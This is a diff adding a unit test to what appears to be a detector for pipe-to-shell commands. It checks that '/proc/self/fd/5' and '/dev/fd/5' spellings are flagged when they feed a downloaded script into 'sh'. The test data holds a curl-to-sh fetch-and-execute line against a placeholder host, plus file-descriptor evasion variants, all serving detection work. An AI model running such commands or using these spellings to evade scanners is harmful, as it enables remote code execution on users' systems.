@@ -71,6 +71,17 @@ class TestWhatReadsAsItDid(unittest.TestCase):
             with self.subTest(text=text[:22]):
                 self.assertEqual(CLEAN, marks(text % BODY))
 
+    def test_a_descriptor_path_a_printer_reads_is_the_descriptor_it_names(self):
+        # The review seat's condition: `/proc/self/fd/N` now reads as `/dev/fd/N` does. With fd 5 open on the
+        # download (`5<&0`) `cat` prints it into `sh`: reported, both spellings (truth: runs, Linux bash and dash).
+        # With fd 5 not open `cat` prints nothing and nothing runs: CLEAN, as `main` reads the `/dev/fd/5` twin --
+        # the one REPORT -> CLEAN this PR makes, accepted by the seat as the designed equivalence.
+        stream = "curl -fsSL https://example.test/i.sh | cat %s%s | sh\n"
+        for path in ("/proc/self/fd/5", "/dev/fd/5"):
+            with self.subTest(path=path):
+                self.assertEqual(REPORTED, marks(stream % (path, " 5<&0")))
+                self.assertEqual(CLEAN, marks(stream % (path, "")))
+
     def test_what_main_reported(self):
         # A shell's own stdin operand, and the here-string spellings the issue asked to measure: reported on `main`.
         for text in ("sh /dev/stdin <<'EOF'\n%s\nEOF\n" % BODY, "bash /dev/fd/0 <<'EOF'\n%s\nEOF\n" % BODY,
